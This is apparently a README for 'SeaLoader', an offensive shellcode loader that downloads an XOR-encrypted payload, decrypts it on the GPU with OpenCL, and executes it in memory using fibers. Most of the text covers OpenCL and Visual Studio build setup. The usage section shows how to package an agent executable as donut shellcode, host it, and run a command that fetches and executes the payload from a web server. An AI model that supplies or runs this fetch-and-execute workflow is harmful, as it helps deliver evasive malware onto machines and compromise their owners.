# SeaLoader
Shellcode loader that downloads and decrypts an XOR encrypted using OpenCL, then launches it with fibers. For a deeper dive, see the blog post here:

[https://p0142.github.io/posts/sealoader/](https://p0142.github.io/posts/sealoader/)

## General instructions for setting up a visual studio project to compile OpenCL
### 1. Install OpenCL SDK / Drivers

OpenCL is not part of Visual Studio itself. You need vendor-specific OpenCL runtime + headers.

* **NVIDIA GPU** → Install the [CUDA Toolkit](https://developer.nvidia.com/cuda-downloads). It includes `OpenCL.dll`, headers, and ICD loader.
* **AMD GPU** → Install the [AMD APP SDK](https://github.com/GPUOpen-LibrariesAndSDKs) (legacy) or ROCm / Windows drivers with OpenCL runtime.
* **Intel GPU / CPU** → Install [Intel OpenCL SDK](https://www.intel.com/content/www/us/en/developer/tools/opencl-sdk/overview.html).

Alternately if you're running this in a VM you can use POCL, which you can get here:

[POCL](https://portablecl.org/)

Grab the SDK here:

[OpenCL-SDK](https://github.com/KhronosGroup/OpenCL-SDK)

After installation, you should have:
* `OpenCL.lib` (import library)
* `OpenCL.dll` (runtime, usually in `C:\Windows\System32`)
* `CL/cl.h` and `CL/opencl.hpp` (headers for C and C++)

---

### 2. Set Up Visual Studio Project
1. Open **Visual Studio** → **Create a new Project** → choose **Console App (C++).**
2. Right-click your project → **Properties**.

#### Include directories
* Go to **C/C++ → General → Additional Include Directories**
* Add the path to OpenCL headers, e.g.:
  ```
  C:\Program Files (x86)\Intel\OpenCL SDK\include
  ```

  or
  ```
  C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v12.x\include
  ```

#### Library directories
* Go to **Linker → General → Additional Library Directories**
* Add path to libraries, e.g.:
  ```
  C:\Program Files (x86)\Intel\OpenCL SDK\lib\x64
  ```

#### Link against OpenCL
* Go to **Linker → Input → Additional Dependencies**
* Add:
  ```
  OpenCL.lib
  ```

From here you should be able to compile the program.

#### Donuts
The donut generator python script requires donut shellcode: https://github.com/TheWover/donut
```
pip install donut-shellcode
```
The loader should work with any shellcode though, not only donut.

# Usage:
Create your payload:
```
python donutGenerator.py -i agent.exe -x "HelloWorld"
```
Host the file on a web server and use the loader to download into memory and execute
```
.\SeaLoader.exe /p:http://example.com/payload.bin /x:HelloWorld
```


